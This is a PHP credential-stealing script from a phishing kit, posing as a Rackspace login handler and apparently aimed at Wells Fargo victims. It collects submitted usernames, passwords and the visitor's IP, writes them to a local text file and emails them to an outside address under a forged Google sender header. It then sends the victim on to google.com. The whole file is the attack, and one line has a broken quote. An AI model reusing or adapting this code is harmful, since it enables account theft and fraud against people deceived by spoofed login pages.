
﻿   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ RACKSPACE LOG +-----------connect---\n";
$message .= "username: ".$_POST['j_username']."\n";
$message .= "password: ".$_POST['j_password']."\n";

$message .= "username: ".$_POST['j_username']."\n";
$message .= "password: ".$_POST['j_password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Authur-----------------\n";



$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


$send = "kerrymarley@hotmail.com, "kerrymarley@hotmail.com";

$subject = "Wells Fargo Spaming ! xD $ip";
$headers = "From: RACKSPACE  <logs@www.accounts.google.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
echo "<meta http-equiv='Refresh' content='0;URL=https://google.com' />";
	  

?>